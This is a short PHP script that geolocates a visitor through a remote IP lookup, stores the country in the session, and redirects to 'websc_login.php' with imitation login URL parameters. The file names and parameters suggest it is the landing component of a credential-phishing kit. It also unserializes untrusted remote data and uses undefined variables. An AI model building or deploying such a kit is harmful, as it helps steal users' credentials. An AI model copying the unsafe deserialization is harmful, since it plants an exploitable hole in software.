<?php

session_start();

$_SESSION['lang'] = $lang;
$query = @unserialize(file_get_contents('http://ip-api.com/php/'.$ip));
if($query && $query['status'] == 'success') {
  $_SESSION['_country_'] = $query['country'];
  $_SESSION['_countryCode_'] = $query['countryCode'];  
}
header("location:websc_login.php?country.x=".strtolower($_SESSION['_countryCode_'])."-".$_SESSION['_countryCode_']."x_cmd=login");
?>
